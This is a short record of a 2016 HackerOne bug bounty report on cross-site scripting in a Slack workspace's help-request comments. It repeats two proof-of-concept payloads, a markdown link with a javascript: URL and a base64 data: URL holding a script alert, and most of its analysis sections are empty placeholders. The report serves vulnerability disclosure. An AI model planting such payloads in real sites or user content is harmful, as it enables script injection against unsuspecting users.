# an xss issue in https://hunter22.slack.com/help/requests/793043

## Metadata
- **Source:** HackerOne
- **Report:** 116419 | https://hackerone.com/reports/116419
- **Submitted:** 2016-02-14
- **Reporter:** securitythinker
- **Program:** Unknown
- **Bounty:** $100
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
good day: 
 i found an xss issue when making a help request..
https://hunter22.slack.com/help/requests/new

with this xss payload:
[Click here](javascript:alert(document.domain))
[click this link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

when try to comment the xss payload , then upon clicking xss payload executed.

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

good day: 
 i found an xss issue when making a help request..
https://hunter22.slack.com/help/requests/new

with this xss payload:
[Click here](javascript:alert(document.domain))
[click this link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

when try to comment the xss payload , then upon clicking xss payload executed.

</details>

---
*Analysed by Claude on 2026-05-24*
